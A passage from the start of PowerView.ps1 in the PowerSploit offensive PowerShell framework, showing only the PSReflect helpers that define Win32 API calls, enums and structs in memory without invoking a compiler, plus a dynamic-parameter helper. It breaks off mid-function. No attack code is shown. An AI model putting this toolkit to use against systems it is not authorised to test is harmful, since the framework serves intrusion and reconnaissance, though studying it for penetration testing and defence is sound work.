#requires -version 2

<#

PowerSploit File: PowerView.ps1
Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: None

#>


########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule {
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func

.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The 'func' helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER EntryPoint

The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

.NOTES

Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


########################################################
#
# Misc. helpers
#
########################################################

Function New-DynamicParameter {
<#
.SYNOPSIS

Helper function to simplify creating dynamic parameters.

    Adapated from https://beatcracker.wordpress.com/2015/08/10/dynamic-parameters-validateset-and-enums/.
    Originally released under the Microsoft Public License (Ms-PL).

.DESCRIPTION

Helper function to simplify creating dynamic parameters.

Example use cases:
    Include parameters only if your environment dictates it
    Include parameters depending on the value of a user-specified parameter
    Provide tab completion and intellisense for parameters, depending on the environment

Please keep in mind that all dynamic parameters you create, will not have corresponding variables created.
    Use New-DynamicParameter with 'CreateVariables' switch in your main code block,
    ('Process' for advanced functions) to create those variables.
    Alternatively, manually reference $PSBoundParameters for the dynamic parameter value.

This function has two operating modes:

1. All dynamic parameters created in one pass using pipeline input to the function. This mode allows to create dynamic parameters en masse,
with one function call. There is no need to create and maintain custom RuntimeDefinedParameterDictionary.

2. Dynamic parameters are created by separate function calls and added to the RuntimeDefinedParameterDictionary you created beforehand.
Then you output this RuntimeDefinedParameterDictionary to the pipeline. This allows more fine-grained control of the dynamic parameters,
with custom conditions and so on.

.NOTES

Credits to jrich523 and ramblingcookiemonster for their initial code and inspiration:
    https://github.com/RamblingCookieMonster/PowerShell/blob/master/New-DynamicParam.ps1
    http://ramblingcookiemonster.wordpress.com/2014/11/27/quick-hits-credentials-and-dynamic-parameters/
    http://jrich523.wordpress.com/2013/05/30/powershell-simple-way-to-add-dynamic-parameters-to-advanced-function/

Credit to BM for alias and type parameters and their handling

.PARAMETER Name

Name of the dynamic parameter

.PARAMETER Type

Type for the dynamic parameter.  Default is string

.PARAMETER Alias

If specified, one or more aliases to assign to the dynamic parameter

.PARAMETER Mandatory

If specified, set the Mandatory attribute for this dynamic parameter

.PARAMETER Position

If specified, set the Position attribute for this dynamic parameter

.PARAMETER HelpMessage

If specified, set the HelpMessage for this dynamic parameter

.PARAMETER DontShow

If specified, set the DontShow for this dynamic parameter.
This is the new PowerShell 4.0 attribute that hides parameter from tab-completion.
http://www.powershellmagazine.com/2013/07/29/pstip-hiding-parameters-from-tab-completion/

.PARAMETER ValueFromPipeline

If specified, set the ValueFromPipeline attribute for this dynamic parameter

.PARAMETER ValueFromPipelineByPropertyName

If specified, set the ValueFromPipelineByPropertyName attribute for this dynamic parameter

.PARAMETER ValueFromRemainingArguments

If specified, set the ValueFromRemainingArguments attribute for this dynamic parameter

.PARAMETER ParameterSetName

If specified, set the ParameterSet attribute for this dynamic parameter. By default parameter is added to all parameters sets.

.PARAMETER AllowNull

If specified, set the AllowNull attribute of this dynamic parameter

.PARAMETER AllowEmptyString

If specified, set the AllowEmptyString attribute of this dynamic parameter

.PARAMETER AllowEmptyCollection

If specified, set the AllowEmptyCollection attribute of this dynamic parameter

.PARAMETER ValidateNotNull

If specified, set the ValidateNotNull attribute of this dynamic parameter

.PARAMETER ValidateNotNullOrEmpty

If specified, set the ValidateNotNullOrEmpty attribute of this dynamic parameter

.PARAMETER ValidateRange

If specified, set the ValidateRange attribute of this dynamic parameter

.PARAMETER ValidateLength

If specified, set the ValidateLength attribute of this dynamic parameter

.PARAMETER ValidatePattern

If specified, set the ValidatePattern attribute of this dynamic parameter

.PARAMETER ValidateScript

If specified, set the ValidateScript attribute of this dynamic parameter

.PARAMETER ValidateSet

If specified, set the ValidateSet attribute of this dynamic parameter

.PARAMETER Dictionary

If specified, add resulting RuntimeDefinedParameter to an existing RuntimeDefinedParameterDictionary.
Appropriate for custom dynamic parameters creation.

If not specified, create and return a RuntimeDefinedParameterDictionary
Appropriate for a simple dynamic parameter creation.
#>

    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$Mandatory,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$Position,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$HelpMessage,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$DontShow,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipeline,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipelineByPropertyName,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromRemainingArguments,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$ParameterSetName = '__AllParameterSets',

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyString,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyCollection,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNullOrEmpty,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateRange,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateLength,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$ValidatePattern,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ValidateScript,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$ValidateSet,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $Dictionary = $false,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$CreateVariables,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            # System.Management.Automation.PSBoundParametersDictionary is an internal sealed class,
            # so one can't use PowerShell's '-is' operator to validate type.
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $BoundParameters
    )

    Begin {
        $InternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $CommonParameters = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if($CreateVariables) {
            $BoundKeys = $BoundParameters.Keys | Where-Object { $CommonParameters -notcontains $_ }
            ForEach($Parameter in $BoundKeys) {
                if ($Parameter) {
                    Set-Variable -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force
                }
            }
        }
        else {
            $StaleKeys = @()
            $StaleKeys = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                # If object has Equals, compare bound key and variable using it
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                # If object doesn't has Equals (e.g. $null), fallback to the PowerShell's -ne operator
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($StaleKeys) {
                $StaleKeys | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }

            # Since we rely solely on $PSBoundParameters, we don't have access to default values for unbound parameters
            $UnboundParameters = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        # Find parameters that are belong to the current parameter set
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                # Find unbound parameters in the current parameter set
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }

            # Even if parameter is not bound, corresponding variable is created with parameter's default value (if specified)
            $tmp = $null
            ForEach ($Parameter in $UnboundParameters) {
                $DefaultValue = Get-Variable -Name $Parameter -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($Parameter, [ref]$tmp) -and $DefaultValue) {
                    $PSBoundParameters.$Parameter = $DefaultValue
                }
            }

            if($Dictionary) {
                $DPDictionary = $Dictionary
            }
            else {
                $DPDictionary = $InternalDictionary
            }

            # Shortcut for getting local variables
            $GetVar = {Get-Variable -Name $_ -ValueOnly -Scope 0}

            # Strings to match attributes and validation arguments
            $AttributeRegex = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $ValidationRegex = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $AliasRegex = '^Alias$'
            $ParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex ($PSBoundParameters.Keys) {
                $AttributeRegex {
                    Try {
                        $ParameterAttribute.$_ = . $GetVar
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }

            if($DPDictionary.Keys -contains $Name) {
                $DPDictionary.$Name.Attributes.Add($ParameterAttribute)
            }
            else {
                $AttributeCollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $ValidationRegex {
                        Try {
                            $ParameterOptions = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterOptions)
                        }
                        Catch { $_ }
                        continue
                    }
                    $AliasRegex {
                        Try {
                            $ParameterAlias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterAlias)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $AttributeCollection.Add($ParameterAttribute)
                $Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)
                $DPDictionary.Add($Name, $Parameter)
            }
        }
    }

    End {
